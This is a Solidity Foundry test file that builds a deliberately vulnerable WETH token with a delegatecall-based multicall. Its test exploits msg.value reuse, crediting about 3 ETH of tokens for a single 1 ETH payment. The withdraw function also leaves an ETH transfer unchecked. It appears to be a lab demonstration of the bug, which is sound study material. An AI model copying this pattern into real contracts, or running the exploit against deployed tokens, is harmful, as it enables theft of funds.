// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "forge-std/Test.sol";
import  "openzeppelin-contracts/token/ERC20/ERC20.sol";

abstract contract Multicall {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);

            require(success);

            if (!success) {
                // Next 5 lines from https://ethereum.stackexchange.com/a/83577
                if (result.length < 68) revert();
                assembly {
                    result := add(result, 0x04)
                }
                revert(abi.decode(result, (string)));
            }

            results[i] = result;
        }
    }
}

contract VulnerableWETH is ERC20, Multicall {
    constructor() ERC20('VulnerableWETH', 'VWETH') {}
    
    receive() external payable {
        _mint(msg.sender, msg.value);
    }
    
    function deposit() external payable {
        _mint(msg.sender, msg.value);
    }
    
    function withdraw(uint256 value) external {
        _burn(msg.sender, value);
        msg.sender.call{value: value}("");
    }
    
    function withdrawAll() external {
        uint256 value = balanceOf(msg.sender);
        _burn(msg.sender, value);
        (bool success, ) = msg.sender.call{value: value}("");
        require(success);
    }
}


contract MyTest is Test {
     VulnerableWETH vul; 
 

    function setUp() public {
        vul = new VulnerableWETH();     
    }

    


   function testMulticall() public{
    bytes[] memory multicalldata = new bytes[](3);

     bytes memory data = abi.encodeWithSignature("deposit()");
     (bool success, ) = address(vul).call{value: 1e18}(data);
     require(success);

     console2.log("balance: %d", vul.balanceOf(address(this)));
   
     multicalldata[0] = data;
     multicalldata[1] = data;
     multicalldata[2] = data;
     

     vul.multicall{value: 1e18}(multicalldata);
     console2.log("final balance: %d", vul.balanceOf(address(this)));
   

   }
}
